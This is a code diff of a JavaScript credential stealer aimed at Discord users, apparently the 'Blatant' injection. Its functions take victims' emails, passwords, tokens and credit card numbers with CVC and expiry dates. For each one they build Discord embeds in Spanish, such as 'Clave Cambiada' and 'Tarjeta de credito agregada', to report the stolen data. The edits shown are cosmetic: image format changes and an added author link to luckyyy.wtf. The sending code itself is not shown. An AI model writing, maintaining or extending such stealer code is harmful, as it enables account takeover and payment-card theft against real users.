@@ -33,7 +33,7 @@ function FirstTime() {
          "title" : "**Blatant inicializado**",
          "color": mainColor,
          "thumbnail": {
-            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`
          },
          "fields": [
             {
@@ -49,6 +49,7 @@ function FirstTime() {
          ],
          "author": {
             "name": "Lvcky on top",
+            "url": "https://luckyyy.wtf",
             "icon_url": "https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"
          },
          "footer": {
@@ -186,7 +187,7 @@ function Login(email, password, token) {
                   "title" : mainName,
                   "color": mainColor,
                   "thumbnail": {
-                     "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                     "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`
                   },
                   "fields": [
                      {
@@ -202,6 +203,7 @@ function Login(email, password, token) {
                   ],
                   "author": {
                      "name": "Lvcky on top",
+                     "url": "https://luckyyy.wtf",
                      "icon_url": "https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"
                   },
                   "footer": {
@@ -232,7 +234,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             "title" : "**Clave Cambiada**",
             "color": mainColor,
             "thumbnail": {
-               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`
             },
             "fields": [
                {
@@ -253,6 +255,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             ],
             "author": {
                "name": "Lvcky on top",
+               "url": "https://luckyyy.wtf",
                "icon_url": "https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"
             },
             "footer": {
@@ -283,7 +286,7 @@ function ChangeEmail(newemail, password, token) {
             "title" : "**Correo Cambiada**",
             "color": mainColor,
             "thumbnail": {
-               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`
             },
             "fields": [
                {
@@ -304,6 +307,7 @@ function ChangeEmail(newemail, password, token) {
             ],
             "author": {
                "name": "Lvcky on top",
+               "url": "https://luckyyy.wtf",
                "icon_url": "https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"
             },
             "footer": {
@@ -334,7 +338,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             "title" : "**Tarjeta de credito agregada**",
             "color": mainColor,
             "thumbnail": {
-               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+               "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`
             },
             "fields": [
                {
@@ -355,6 +359,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             ],
             "author": {
                "name": "Lvcky on top",
+               "url": "https://luckyyy.wtf",
                "icon_url": "https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"
             },
             "footer": {
